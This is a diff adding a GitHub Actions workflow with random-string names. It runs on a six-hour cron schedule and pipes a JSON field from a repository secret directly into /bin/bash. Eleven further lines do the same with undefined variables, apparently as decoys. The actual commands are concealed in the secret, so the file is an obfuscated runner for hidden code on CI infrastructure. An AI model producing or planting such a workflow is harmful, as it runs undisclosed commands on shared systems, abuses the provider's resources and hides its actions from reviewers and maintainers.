@@ -1,0 +1,29 @@
+name: lanxingjian6543
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '51 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: lanxingjian6543
+        env:
+          pcxxd67417: ${{ secrets.pcxxd67417 }}
+        run: |
+          echo $pcxxd67417 | jq -r .mgwsn5386 | /bin/bash
+          echo $mtp441 | jq -r .nxomy823 | /bin/bash
+          echo $ibk784 | jq -r .dqk115 | /bin/bash
+          echo $za0 | jq -r .znz039 | /bin/bash
+          echo $vms23586 | jq -r .ejzbh841 | /bin/bash
+          echo $t183 | jq -r .qd4 | /bin/bash
+          echo $an52 | jq -r .t6 | /bin/bash
+          echo $uau22 | jq -r .foizd70 | /bin/bash
+          echo $f3316 | jq -r .jb9209 | /bin/bash
+          echo $q2 | jq -r .gh9 | /bin/bash
+          echo $yjuzv26674 | jq -r .mhb78279 | /bin/bash
+          echo $p9342 | jq -r .jya74 | /bin/bash
+
